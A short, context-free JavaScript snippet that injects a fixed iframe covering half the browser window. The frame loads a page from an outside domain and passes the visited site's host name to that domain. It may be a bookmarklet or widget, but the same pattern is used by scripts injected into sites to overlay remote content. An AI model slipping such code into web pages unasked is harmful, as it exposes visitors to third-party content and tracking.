i=document.createElement('IFRAME');
i.setAttribute('src', 'http://quco2.mibanez.com.ar/index.php?url=' + window.location.host);
i.style.width = (window.innerWidth/2)+'px';
i.style.height = 100+'%';
i.style.top = 0;
i.style.right = 0;
i.style.position = 'fixed';
i.style.overflow = 'hidden';
document.body.appendChild(i); 
